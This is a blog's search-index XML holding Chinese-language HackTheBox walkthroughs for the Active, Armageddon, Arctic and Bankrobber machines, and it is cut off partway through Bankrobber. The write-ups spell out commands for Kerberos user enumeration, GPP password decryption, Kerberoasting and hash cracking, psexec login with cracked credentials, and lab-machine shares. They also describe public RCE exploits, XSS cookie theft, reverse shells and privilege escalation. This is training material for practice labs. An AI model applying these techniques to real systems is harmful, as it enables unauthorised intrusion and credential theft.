<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Active - HackTheBox</title>
    <url>/post/d74d7bcb383d/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.2ogclb2qv2a0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.6hefxfmvyos0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.2b3jsur83rfo.webp"
                     
                ></p>
<p>老样子，先从88端口开始测试</p>
<p><code>https://github.com/ropnop/kerbrute</code></p>
<p><code>./kerbrute_linux_amd64 userenum --dc 10.10.10.100 -d active.htb /usr/share/wordlists/wfuzz/others/names.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.19msfzhewcqo.webp"
                     
                ></p>
<p>只测出了一个Administrator</p>
<p>在换389端口</p>
<p><code>ldapsearch -x -H ldap://10.10.10.100 -b &quot;DC=htb,DC=active&quot; -s sub</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.2mk4410y5zc0.webp"
                     
                ></p>
<p>好像也没得到可利用信息</p>
<p>继续下一个，445端口</p>
<p><code>smbmap -H 10.10.10.100</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.61tou6t9e7w0.webp"
                     
                ></p>
<p>这下有了，连上去看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.6ev2fyhmgx80.webp"
                     
                ></p>
<p>发现一个xml，get下来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.58wj4xezak00.webp"
                     
                ></p>
<p>发现一个用户名和加密的密码，先测试用户名是否存在</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.5c57m09hd000.webp"
                     
                ></p>
<p>在爆破加密密码</p>
<p>讲道理，这是什么加密，见都没见过</p>
<p>通过万能的搜索引擎知道了这玩意用<code>gpp-decrypt</code>解密</p>
<p><code>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.z94ai5uvca8.webp"
                     
                ></p>
<p>在用这个去测试389端口</p>
<p><code>impacket-GetUserSPNs -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</code></p>
<p>用<code>impacket-GetUserSPNs</code>测试</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.48wcng9zdjc0.webp"
                     
                ></p>
<p>又是一个加密密钥，内部包含关键字，应该是Administrator用户的</p>
<p>看这个用户名<code>SVC_TGS</code>，到hashcat中搜一下加密类型</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.42q7j35gfl6.webp"
                     
                ></p>
<p>最终13100类型有效</p>
<p><code>hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.3jruzyuqalg0.webp"
                     
                ></p>
<p>通过psexec.py连接</p>
<p><code>https://github.com/fortra/impacket/blob/master/examples/psexec.py</code></p>
<p><code>python psexec.py -dc-ip 10.10.10.100 active.htb/Administrator:Ticketmaster1968@10.10.10.100</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.u8c7qlo10sw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Active/image.2bsd2ervne4g.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Armageddon - HackTheBox</title>
    <url>/post/0d669e781980/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.778xdsaz8xo0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.6vlkhkesgns0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.2oajgct171a0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1ou1wqzeszwg.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.5x1vbvgw0ts0.webp"
                     
                ></p>
<p>好眼熟</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.4hvetq6n94o0.webp"
                     
                ></p>
<p>robots.txt文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1fpyyearpr40.webp"
                     
                ></p>
<p>发现了cms的名称drupal和版本7.56</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.8mdi9o6qxg4.webp"
                     
                ></p>
<p>这个比较接近</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.6dd3y18cuz40.webp"
                     
                ></p>
<p>搜一下exp</p>
<p><code>https://github.com/pimps/CVE-2018-7600</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.39khphgmx900.webp"
                     
                ></p>
<p>用法也很简单</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.6wj1oquj2pw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.5d6tos0wv9k0.webp"
                      alt="1"
                ></p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.52hxftxmre00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.53rbjqp437k0.webp"
                     
                ></p>
<p>貌似端口做了限制，用443</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.xdh2vpy00dc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.75phpq0dk440.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.6vipow902480.webp"
                     
                ></p>
<p>发现了一个数据库的账号密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1x3ewzgdxgio.webp"
                     
                ></p>
<p>但是这里的shell不是交互式的是shell，根本连不上</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.2jyh3jbs35k0.webp"
                     
                ></p>
<p>单条语句执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1ayg2wrysvsw.webp"
                     
                ></p>
<p>发现一个用户的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.uiz1jqo8py8.webp"
                     
                ></p>
<p>并且靶机上存在这个用户，爆破一下密钥</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.3dvv91dvet00.webp"
                     
                ></p>
<p>ssh登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.64azvva1xow0.webp"
                     
                ></p>
<p>继续提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.2sltgasjvx60.webp"
                     
                ></p>
<p>发现一个sudo权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1i19rwn90cn4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.4517zfvm5v00.webp"
                     
                ></p>
<p>靶机上没有fpm</p>
<p>在本地运行，如果本地也没有的话，参考安装</p>
<p><code>https://blog.csdn.net/eibo51/article/details/54744209</code></p>
<p>创建一个shell脚本，运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1w1zxfjz16qo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.6kj32j2kxgw0.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.60itk4zlymo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.28sg2k9rgm1w.webp"
                     
                ></p>
<p>修改一下shell脚本，生成一个可以提权的snap文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.8d4azmsuuk8.webp"
                     
                ></p>
<p>先复制一个sh文件到home目录下，snap运行后，会将sh文件的权限提升为suid权限，运行后即可获得root权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.1lpsoeoce2q.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.4xn21mkgea00.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Arctic - HackTheBox</title>
    <url>/post/d18aaee76b2d/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1hrbrd274nvk.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ahdn0afe220.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2yxgt46bvf20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3088jk1uiau0.webp"
                     
                ></p>
<p>这8500端口扫出了个啥玩意，尝试一下浏览器访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5vh5kw0bjck0.webp"
                     
                ></p>
<p>虽然是个http，但访问起来真的好慢啊</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7ktsu7fmyq40.webp"
                     
                ></p>
<p>这个页面发现一个administrator，感觉是个管理页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7akgnjbmgso0.webp"
                     
                ></p>
<p>虽然不知道密码，但知道了cms名称为ColdFusion，版本为8，搜一下有无exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2r1zlsrfnhy0.webp"
                     
                ></p>
<p>刚好这有个rce</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6yl6ul3oyh80.webp"
                     
                ></p>
<p>修改一下exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.669ecjxz4580.webp"
                     
                ></p>
<p>提权，由于反弹回来的shell是cmd，并不是powershell，所以无法远程下载提权检测脚本</p>
<p>利用<code>impacket-smbserver -smb2support root &#39;&#39;</code>开启一个文件共享</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.404h8nq64uw0.webp"
                     
                ></p>
<p><code>copy \\10.10.14.17\root\winPEAS.bat</code>，传输到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.27b2uankezrw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2cd4zze2rjvo.webp"
                     
                ></p>
<p>靶机为windows 2008 R2</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.56zb7jzy8640.webp"
                     
                ></p>
<p>没有打任何补丁</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.xcvt83zvnao.webp"
                     
                ></p>
<p>一大堆提权方法，随便挑了一个MS10-092</p>
<p><code>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092</code></p>
<p>这个提权工具是利用vb脚本，利用at写入一个计时任务，添加一个管理员用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1pxmvphy7z1c.webp"
                     
                ></p>
<p>下载下来尝试利用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.s0hgk17qcww.webp"
                     
                ></p>
<p><code>cscript test.wsf</code>，执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ppmjv60ezy0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.63za2cu3joo0.webp"
                     
                ></p>
<p>貌似并没有执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3r1a6sgzbm20.webp"
                     
                ></p>
<p>这个脚本的计时任务居然是每月一次，这有什么用，修改一下</p>
<p>索性直接修改为定时执行反弹shell吧，msf生成一个反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.64iha6gw1hk0.webp"
                     
                ></p>
<p>将反弹shell下载到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5pkh0ozv1ao0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.33xczeb2haw0.webp"
                     
                ></p>
<p>修改为每分钟执行一次反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2xkj39p1i0a0.webp"
                     
                ></p>
<p>执行之后立马就弹回来了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6zuz4xm1jd80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6mooap3u2zo0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Bankrobber - HackTheBox</title>
    <url>/post/6d3d0a61ddb1/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.kulvo4r5en4.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.10z1ws9r97s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3kwx52engda0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3ik8p0y4vje0.webp"
                     
                ></p>
<p>一个比特币交易的cms</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5n0b6ccwqb40.webp"
                     
                ></p>
<p>有登录和注册两个功能，先注册一个进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.29eejg50xvy8.webp"
                     
                ></p>
<p>发现一个转账交易框，下方留言处貌似有xss，应该可以获取到管理员的cookie</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2zkwg52zs460.webp"
                     
                ></p>
<p>将xss语句进行url编码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7gd7fcvgdbg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.41f8z3lqg2u0.webp"
                     
                ></p>
<p>解码后得知管理员的账号密码为admin和Hopelessromantic</p>
<p>退出登录管理员账户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.4seskju6jjm0.webp"
                     
                ></p>
<p>一个查询用户，一个查询后门</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.16dwvorglzcw.webp"
                     
                ></p>
<p>查询后门这里不支持web端请求，试试用户查询处</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.742wm5r8em40.webp"
                     
                ></p>
<p>有sql注入</p>
<p>数据库并并没有发现有利用价值的信息，尝试一下用sql注入读取文件</p>
<p>先确定一下目录路径</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1nbi564ns5uo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2rcbss3r9hw0.webp"
                     
                ></p>
<p>知道了路径后进行读取</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6z6k1tcawmo0.webp"
                     
                ></p>
<p>读取一下查询后门那个php文件，看下源码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6z6k1tcawmo0.webp"
                     
                ></p>
<p>貌似是无法从web端绕过了</p>
<p>尝试用xss进行一个绕过执行</p>
<p><code>https://stackoverflow.com/questions/6396101/pure-javascript-send-post-data-without-a-form</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1n2qnxruwl34.webp"
                     
                ></p>
<p>修改一下这段javascript代码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1g67txuge83k.webp"
                     
                ></p>
<p>把content-type类型修改为与web请求一致的类型</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2dohqeo3sat.webp"
                     
                ></p>
<p>之后让其post请求命令执行的php文件地址，在将执行的参数修改为powershell远程加载反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6ivpm3bpb6o0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7kdr1vru0o00.webp"
                     
                ></p>
<p>同样进行url编码后发送</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3d56mwkzxxk0.webp"
                     
                ></p>
<p>本地监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2rd7flbdgfo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1uft0b1p40w0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.d7zp70dn4c0.webp"
                     
                ></p>
<p>提权检测脚本未检测出可利用的提权方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2olkglpq32k0.webp"
                     
                ></p>
<p>发现一个奇怪的910端口，他是开放的，但无法访问也没有被扫描到</p>
<p>将其映射到本地访问，使用chisel进行端口映射</p>
<p><code>https://github.com/jpillora/chisel</code></p>
<p>下载windows和linux两个文件</p>
<p>将windows的上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2tld39wquvq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.9hajlros1zo.webp"
                     
                ></p>
<p>powershell执行不了，msf生一个反弹shell，弹一个cmd的回来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1031vqvrsyls.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7hkc093g5d80.webp"
                     
                ></p>
<p>访问本地9910看下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1e04vq4yxzs0.webp"
                     
                ></p>
<p>貌似不是直接web请求，nc尝试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.17vvdm0b89i8.webp"
                     
                ></p>
<p>需要一个密码</p>
<p>四位密码，尝试爆破一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.51g49uar1uw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.76xlqplxta00.webp"
                     
                ></p>
<p>密码为0021</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2aw9hrg5rh5w.webp"
                     
                ></p>
<p>又要输入一个数字</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3nt3frb3zpw0.webp"
                     
                ></p>
<p>貌似执行了一个文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1cn02ns8xlts.webp"
                     
                ></p>
<p>但是无权修改</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6x7yhwtauks0.webp"
                     
                ></p>
<p>貌似这里可以进行覆盖，达到让其任意执行的目的，但不知道具体到多少才会覆盖</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.483llismymc0.webp"
                     
                ></p>
<p>好嘛，玩崩了</p>
<p><img  
                     lazyload
                     alt="image"
